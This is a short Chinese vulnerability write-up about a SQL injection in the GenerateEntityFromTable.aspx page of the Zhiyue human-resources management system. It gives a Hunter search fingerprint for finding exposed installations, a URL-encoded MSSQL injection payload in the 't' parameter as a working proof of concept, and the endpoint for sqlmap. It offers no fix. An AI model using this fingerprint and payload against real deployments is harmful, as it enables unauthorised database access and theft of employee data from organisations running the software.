# 智跃人力资源管理系统 GenerateEntityFromTable.aspx SQL注入漏洞

# 一、漏洞简介
智跃人力资源管理系统是基于B/S网页端广域网平台，一套考勤系统即可对全国各地多个分公司进行统一管控，成本更低。信息共享更快。跨平台，跨电子设备。智跃人力资源管理系统 GenerateEntityFromTable.aspx SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。

# 二、影响版本
+ 智跃人力资源管理系统

# 三、资产测绘
+ hunter`web.body="ZY.LOGO.64.png"`
+ 特征

![1700999921759-eb1f0195-0120-4c54-8bc9-5818fb075b7e.png](./img/94IJ8Ml0P1Ag0IDx/1700999921759-eb1f0195-0120-4c54-8bc9-5818fb075b7e-497556.png)

# 四、漏洞复现
```plain
/resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select%20SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27,%271230%27)),3,32)))%2B%27
```

![1700999949055-76cc2f2c-0826-473c-943e-676e36dc5e33.png](./img/94IJ8Ml0P1Ag0IDx/1700999949055-76cc2f2c-0826-473c-943e-676e36dc5e33-974501.png)

sqlmap

```plain
/resource/utils/GenerateEntityFromTable.aspx?t=1
```

![1701000199428-d43731eb-8092-4b6d-9abc-9a57e4a8f9ae.png](./img/94IJ8Ml0P1Ag0IDx/1701000199428-d43731eb-8092-4b6d-9abc-9a57e4a8f9ae-184237.png)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zwvy0quhfwnddcae>